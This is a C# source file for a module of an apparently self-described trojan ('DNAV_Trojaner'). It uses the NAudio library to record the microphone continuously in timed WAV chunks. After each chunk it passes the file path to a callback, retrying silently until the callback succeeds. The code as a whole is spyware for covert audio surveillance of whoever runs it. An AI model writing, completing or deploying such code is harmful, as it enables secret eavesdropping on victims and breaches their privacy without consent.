using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using NAudio.Wave;
using System.Threading;

namespace DNAV_Trojaner {
    class Audio {
        //! benötigt: https://github.com/naudio/NAudio/releases
        private WaveInEvent waveSource = null;
        private WaveFileWriter waveFile = null;
        private WaveInEvent waveSourceB = null;
        private WaveFileWriter waveFileB = null;
        private bool loop = true;
        private bool controller = true;
        private string path = "default";
        private int time = 100; // Dauer der Durchläufe in Sekunden

        static private Audio Main = new Audio();
        static private Thread t;
        static public void start(){
            t = new Thread(
            new ThreadStart(Main.pstart));
            t.Start();
        }

        static public void start(int interval){
            t = new Thread(
            new ThreadStart(Main.pstart));
            t.Start(interval);
        }

        static public void start(int interval, Execution func){
            t = new Thread(
            new ThreadStart(Main.pstart));
            t = new Thread(() => Main.pstart(interval,func));
            t.Start();
        }

        static public void stop(){
            Main.pstop();
        }

        static public void setPath(string p){
            Main.path = p;
        }
        private void DataAvailable(WaveFileWriter wF,WaveInEventArgs e){
             if (wF != null) {
                wF.Write(e.Buffer, 0, e.BytesRecorded);
                wF.Flush();
            }
        }

        private void RecordingStopped(WaveInEvent wS, WaveFileWriter wF){
            if (wS != null) {
                wS.Dispose();
                wS = null;
            }

            if (wF != null) {
                wF.Dispose();
                wF = null;
            }
        }
        private void waveSource_DataAvailable(object sender, WaveInEventArgs e) {
            DataAvailable(waveFile,e);
        }

        private void waveSource_RecordingStopped(object sender, StoppedEventArgs e) {
           RecordingStopped(waveSource,waveFile);
        }

        private void waveSourceB_DataAvailable(object sender, WaveInEventArgs e) {
            DataAvailable(waveFileB,e);
        }

        private void waveSourceB_RecordingStopped(object sender, StoppedEventArgs e) {
           RecordingStopped(waveSourceB,waveFileB);
        }
        private void ini() {
            controller = true;
            ini("");
        }
        private void ini(string suffix) {
            if (controller) {
                controller = false;
                waveSource = new WaveInEvent();
                waveSource.WaveFormat = new WaveFormat(44100, 1);
                waveSource.DataAvailable += new EventHandler < WaveInEventArgs > (waveSource_DataAvailable);
                waveSource.RecordingStopped += new EventHandler < StoppedEventArgs > (waveSource_RecordingStopped);
                waveFile = new WaveFileWriter(path + suffix + ".wav", waveSource.WaveFormat);
            } else {
                controller = true;
                waveSourceB = new WaveInEvent();
                waveSourceB.WaveFormat = new WaveFormat(44100, 1);
                waveSourceB.DataAvailable += new EventHandler < WaveInEventArgs > (waveSourceB_DataAvailable);
                waveSourceB.RecordingStopped += new EventHandler < StoppedEventArgs > (waveSourceB_RecordingStopped);
                waveFileB = new WaveFileWriter(path + suffix + ".wav", waveSourceB.WaveFormat);
            }
        }
        public delegate void Execution(string path);

        private void pstart() { 
            ini();
            waveSource.StartRecording();
        }

        private void pstart(int interval) { 
            pstart(interval, (path) => {});
        }
        private void pstart(int interval, Execution func) { 
            time = interval;
            loop = true;
            int i = 1;
            controller = true;
            ini("" + (i++));
            waveSource.StartRecording();
            while (loop) {
                System.Threading.Thread.Sleep(time * 1000);
                if (controller) {
                    waveSourceB.StopRecording();
                } else {
                    waveSource.StopRecording();
                }
                ini("" + (i++));
                if (controller) {
                    waveSourceB.StartRecording();
                } else {
                    waveSource.StartRecording();
                }
                while (true) {
                    try {
                        func(path + (i - 2)+ ".wav");
                        break;
                    } catch (Exception e) {}
                }
            }
        }

        private void pstop() { 
            loop = false;
            waveSource.StopRecording();
        }

        public Audio(string p) {
            path = p;
        }
        public Audio() {}

    }
}
